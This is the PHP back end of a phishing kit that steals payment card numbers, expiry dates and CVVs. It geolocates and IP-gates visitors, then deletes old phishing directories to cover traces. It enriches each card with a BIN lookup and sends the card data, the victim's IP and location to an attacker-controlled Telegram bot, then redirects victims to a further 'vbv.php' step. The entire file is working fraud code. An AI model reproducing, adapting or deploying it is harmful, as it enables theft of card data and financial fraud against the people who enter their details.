<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

session_start();
$StrupLom = $_SERVER['REMOTE_ADDR'];
$donflag = $_SERVER['SERVER_NAME'];
    $info = unserialize(file_get_contents("http://ip-api.com/php/{$StrupLom}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query"));
    if (isset($info['as'])) {
        $_SESSION['isp'] = $info['as'];
    }else
	{
		$_SESSION['isp'] = "";
	}
    if (isset($info['country'])) {
        $_SESSION['Blasacoun'] = $info['country'];
    }else
	{
		$_SESSION['Blasacoun'] = "";
	}
	
    if (isset($info['countryCode'])) {
        $_SESSION['Njopf'] = $info['countryCode'];
    }else
	{
		$_SESSION['Njopf'] = "";
	}
    if (isset($info['city'])) {
        $_SESSION['Voprt'] = $info['city'];
    }else
	{
		$_SESSION['Voprt'] = "";
	}
    if (isset($info['regionName'])) {
        $_SESSION['xOpuy'] = $info['regionName'];
    }else
	{
		$_SESSION['xOpuy'] = "";
	}
function deleteDirectory($dir) {
    if (!file_exists($dir)) {
        return true;
    }
    if (!is_dir($dir)) {
        return unlink($dir);
    }
    $time_diff = time() - filectime($dir);
    if ($time_diff > 320) { // if the difference is greater than 4 minutes (240 seconds)
        foreach (scandir($dir) as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }
            if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
              
                return false;
            }
        }
        if (rmdir($dir)) {
          
            return true;
        } else {
          
            return false;
        }
    } else {
     
        return true;
    }
}

$parentDirectory = '../../web';
$directories = glob($parentDirectory.'/*', GLOB_ONLYDIR);

if(is_array($directories)) {
  
    foreach($directories as $dir) {
        if(basename($dir)[0] != '.') { 
            if(deleteDirectory($dir)) {
            
            }  
        }
    }
}
$filename = 'local.txt';
if (file_exists($filename)) {
    $myfile = fopen($filename, "r") or die("Unable to open file!");
    $reslocal = fread($myfile,filesize($filename));

fclose($myfile);
} 
else {
	$StrongSol = "" . basename(__DIR__);
    echo ("<script LANGUAGE='JavaScript'>
    window.location.href='../../index.php?verify_account=session=&" . md5(microtime()) . "&dispatch=" . sha1(microtime()) . "&access=&data=" . sha1(microtime()) . "&lolme=$StrongSol';
    </script>");
    exit();
}



if (trim($reslocal) != trim($StrupLom))
    {
		
    $StrongSol = "" . basename(__DIR__);
    echo ("<script LANGUAGE='JavaScript'>
    window.location.href='../../index.php?verify_account=session=&" . md5(microtime()) . "&dispatch=" . sha1(microtime()) . "&access=&data=" . sha1(microtime()) . "&lolme=$StrongSol';
    </script>");
     exit();	  

}

function telsent($message) {
    $TrubFtub = $_SESSION['idtel'];
    $cRetVckr = $_SESSION['tokentel'];
    $api_url = "https://api.telegram.org/bot{$cRetVckr}/sendMessage";
    $params = ["chat_id" => $TrubFtub, "text" => $message];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
}
function binlist_info($bin) {
    $curl = curl_init();

    curl_setopt_array($curl, array(
        CURLOPT_URL => "https://lookup.binlist.net/$bin",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => "",
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => "GET",
        CURLOPT_HTTPHEADER => array(
            "Accept-Version: 3"
        ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return $response;
}
if(isset($_POST['d2'])){
    
$date1 = $_POST['d3'];
$date2 = $_POST['d4'];

$cc2 = isset($_POST['d2']) ? $_POST['d2'] : null;
$cc3 = "$date1/$date2";
$cc4 = isset($_POST['d5']) ? $_POST['d5'] : null;

if (!empty($cc2)) {
    $card_number = str_replace(' ', '', $cc2);
    $first_six_digits = substr($card_number, 0, 6);
    $response = binlist_info($first_six_digits);
    $response_array = json_decode($response, true);

    $number_length = isset($response_array['number']['length']) ? $response_array['number']['length'] : null;
    $number_luhn = isset($response_array['number']['luhn']) ? $response_array['number']['luhn'] : null;
    $scheme = isset($response_array['scheme']) ? $response_array['scheme'] : null;
    $type = isset($response_array['type']) ? $response_array['type'] : null;
    $brand = isset($response_array['brand']) ? $response_array['brand'] : null;
    $prepaid = isset($response_array['prepaid']) ? $response_array['prepaid'] : null;
    $country_numeric = isset($response_array['country']['numeric']) ? $response_array['country']['numeric'] : null;
    $country_alpha2 = isset($response_array['country']['alpha2']) ? $response_array['country']['alpha2'] : null;
    $country_name = isset($response_array['country']['name']) ? $response_array['country']['name'] : null;
    $country_emoji = isset($response_array['country']['emoji']) ? $response_array['country']['emoji'] : null;
    $country_currency = isset($response_array['country']['currency']) ? $response_array['country']['currency'] : null;
    $country_latitude = isset($response_array['country']['latitude']) ? $response_array['country']['latitude'] : null;
    $country_longitude = isset($response_array['country']['longitude']) ? $response_array['country']['longitude'] : null;
    $bank_name = isset($response_array['bank']['name']) ? $response_array['bank']['name'] : null;
    $bank_url = isset($response_array['bank']['url']) ? $response_array['bank']['url'] : null;
    $bank_phone = isset($response_array['bank']['phone']) ? $response_array['bank']['phone'] : null;
    $bank_city = isset($response_array['bank']['city']) ? $response_array['bank']['city'] : null;
} else {
    // Handle the case where $cc2 is null or empty
	echo "big error";
}


$TIME_DATE = date('Y-m-d H:i:s');
$sysmsg = "
*** Project ORG *** \n
[💳][CCN] = $cc2 \n
[💳][EXP] = $cc3 \n
[💳][CVV] = $cc4 \n
[+][Scheme] = $scheme \n
[+][Type] = $type \n
[+][Brand ]= $brand \n
[+][Prepaid] = $prepaid \n
[+][Country Name] =  $country_emoji $country_name \n
[+][Bank Name] = $bank_name \n
[+][Bank URL] = $bank_url \n
[+][Bank Phone] = $bank_phone \n
[+][Bank City] = $bank_city \n
-------------------------\n
[URL] = $donflag \n
[COUNTRY] = " .$_SESSION['Blasacoun']." \n
[Region] = ". $_SESSION['xOpuy']." \n
[ISP] = ".$_SESSION['isp']." \n
[IP]  = $StrupLom \n
[TIME/DATE]  = $TIME_DATE \n
*** By *Key ***\n";

       telsent($sysmsg);

       $_SESSION['card'] = $cc2;
	   $_SESSION['rankname'] = $bank_name;
	   $_SESSION['typename'] = $scheme;
	   $_SESSION['level']= $brand;
	   $_SESSION['binphone']= $bank_phone;
		echo ("<script LANGUAGE='JavaScript'>
    window.location.href='vbv.php?verify_account=session=&".md5(microtime())."&dispatch=".sha1(microtime())."&access=".sha1(microtime())."&data=".sha1(microtime())."';
    </script>");	
}

?>